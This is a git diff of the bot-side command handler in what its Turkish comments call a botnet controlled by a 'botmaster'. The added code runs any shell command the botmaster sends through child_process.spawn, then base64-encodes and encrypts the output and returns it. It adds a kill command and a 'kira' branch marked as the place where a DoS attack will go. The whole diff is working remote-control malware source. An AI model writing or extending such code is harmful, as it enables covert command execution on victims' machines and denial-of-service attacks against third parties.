@@ -5,6 +5,9 @@ module.exports = function(){
         var Packet = require('../models/Packet');
         var Promise = require('promise');
 
+        var spawn = require('child_process').spawn;
+
+
         var os = require('os');
         var hostname = os.hostname();
 
@@ -14,6 +17,7 @@ module.exports = function(){
         var command;
         var commandData;
 
+        //Botmasterdan gelen paketin işlendiği kısım.
         var processPacket = function(packet, receiver_id, sender_id){
             self.sender_id = sender_id;
             self.receiver_id = receiver_id;
@@ -28,62 +32,134 @@ module.exports = function(){
 
         };
 
+        //Botmasterdan gelen terminal komutlarının karşılandığı fonksiyon.
         function commandHandler(command, commandData, receiver_id, sender_id){
             console.log("COMMAND="+command);
+
             if(command == 'cmd'){
 
-                var result;
-                var splitted = commandData.split(' ');
-                var firstElement = splitted[0];
-                //shift metodu dizinin ilk elemanını diziden çıkartır.
-                splitted.shift();
+                    var result;
+                    var splitted = commandData.split(' ');
+                    var firstElement = splitted[0];
+                    //shift metodu dizinin ilk elemanını diziden çıkartır.
+                    splitted.shift();
 
-                var args = splitted;
+                    var args = splitted;
 
-                if(args === firstElement){
-                    args = [];
-                }
+                    if(args === firstElement){
+                        args = [];
+                    }
 
-                if(firstElement === 'kill'){
-                    try{
+                    if(firstElement === 'kill'){
+                        try{
+                            //Child prosesin sonlandırılması ve botmastera bu bilginin yollanması.
+                            child_p.kill();
+                            var paket = new Packet(receiver_id, sender_id, {
+                                output:new Buffer.from("Proses basariyla sonlandirildi.").toString('base64'),
+                                name:hostname});
+
+                            var encoded = parser.encode(paket);
+                            console.log("ENCODED",encoded);
+                            var encrypted = crypto.encrypt(encoded);
+                            console.log("ENCRYPTED="+encrypted);
+                            return encrypted;
+
+                        }catch (err){
+                            var paket = new Packet(receiver_id, sender_id, {
+                                output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
+                                name:hostname});
+
+                            var encoded = parser.encode(paket);
+                            console.log("ENCODED",encoded);
+                            var encrypted = crypto.encrypt(encoded);
+                            console.log("ENCRYPTED="+encrypted);
+                            return encrypted;
+                        }
+
+                    }else if(firstElement === 'kira'){
+
+                        //burada dos saldırısı yapılacak.
+
+                    }else{
+                        //Botmasterın gönderdiği komutu icra eden kısım. Output oldukça fulfill gönderir.
+                        return new Promise(function(fulfill, reject){
+                            child_p = spawn(firstElement, args);
+                            child_p.stdout.setEncoding('utf-8');
+
+                            child_p.on('error', function(output){
+                                var paket = new Packet(receiver_id, sender_id, {
+                                    output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
+                                    name:hostname});
+
+                                var encoded = parser.encode(paket);
+                                console.log("ENCODED",encoded);
+                                var encrypted = crypto.encrypt(encoded);
+                                console.log("ENCRYPTED="+encrypted);
+                                fulfill(encrypted);
+
+                            });
+
+                            child_p.stdout.on('data', function(data){
+
+                                var output=data;
+                                if(data){
+                                    console.log('veri gönderiliyor..'+output);
+                                    var x = new Buffer(output).toString('base64');
+                                    console.log("BASE-STRING="+x);
+                                    paket = new Packet(receiver_id, sender_id, {
+                                        output:new Buffer(output).toString('base64'),
+                                        name:hostname});
+                                    console.log("OUTPUT="+output);
+                                    var encoded = parser.encode(paket);
+                                    console.log("ENCODED",encoded);
+                                    var encrypted = crypto.encrypt(encoded);
+                                    console.log("ENCRYPTED="+encrypted);
+                                    fulfill(encrypted);
+                                }
+
+                            });
+                        })
+                        //Botmaster terminal komutu gönderdiğinde çalışacak kısım.
+                        /*return new Promise(function(fulfill, reject){
+                           //console.log(data);
+                           child_p = spawn(firstElement, args);
+                           child_p.stdout.setEncoding('utf-8');
+
+                           child_p.on('error', function(output){
+                               var paket = new Packet(receiver_id, sender_id, {
+                                   output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
+                                   name:hostname});
+
+                               var encoded = parser.encode(paket);
+                               console.log("ENCODED",encoded);
+                               var encrypted = crypto.encrypt(encoded);
+                               console.log("ENCRYPTED="+encrypted);
+                               fulfill(encrypted);
+
+                           })
+
+                           child_p.stdout.on('data', function(data){
+
+                               var output=data;
+                               console.log('veri gönderiliyor..'+output);
+                               var x = new Buffer(output).toString('base64');
+                               console.log("BASE-STRING="+x);
+                               paket = new Packet(receiver_id, sender_id, {
+                                   output:new Buffer(output).toString('base64'),
+                                   name:hostname});
+                               console.log("OUTPUT="+output);
+                               var encoded = parser.encode(paket);
+                               console.log("ENCODED",encoded);
+                               var encrypted = crypto.encrypt(encoded);
+                               console.log("ENCRYPTED="+encrypted);
+                               fulfill(encrypted);
+
+                           });
+
+                       })*/
+
 
                     }
-                }
-
-                return new Promise(function(fulfill, reject){
-                    //console.log(data);
-                    var child = new run_cmd(firstElement, args);
-                    child.stdout.setEncoding('utf-8');
-
-                    child.on('error', function(output){
-                        var paket = new Packet(receiver_id, sender_id, {
-                            output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
-                            name:hostname});
-
-                        var encoded = parser.encode(paket);
-                        console.log("ENCODED",encoded);
-                        var encrypted = crypto.encrypt(encoded);
-                        console.log("ENCRYPTED="+encrypted);
-                        fulfill(encrypted);
-                    })
-
-                    child.stdout.on('data', function(data){
-
-                        var output=data;
-                        console.log('veri gönderiliyor..'+output);
-                        paket = new Packet(receiver_id, sender_id, {
-                            output:new Buffer.from(output).toString('base64'),
-                            name:hostname});
-                        console.log("OUTPUT="+output);
-                        var encoded = parser.encode(paket);
-                        console.log("ENCODED",encoded);
-                        var encrypted = crypto.encrypt(encoded);
-                        console.log("ENCRYPTED="+encrypted);
-                        fulfill(encrypted);
-
-                    });
-
-                })
 
 
 
@@ -107,18 +183,18 @@ module.exports = function(){
         }
 
 
-        function run_cmd(cmd, args){
+        /*function run_cmd(cmd, args){
             //spawn, sistem komutlarını çalıştırmamızı sağlayan bir komuttur.
             //child_process modülü bize isletim sistemi fonksiyonlarına erişmemizi sağlar.
             //spawn çağrısıyla dönen child proses return edilir.
-            var spawn = require('child_process').spawn;
+
             console.log("CMDD="+cmd);
+
+
             var child_p = spawn(cmd, args);
 
-
-
             return child_p;
-        }
+        }*/
 
 
 
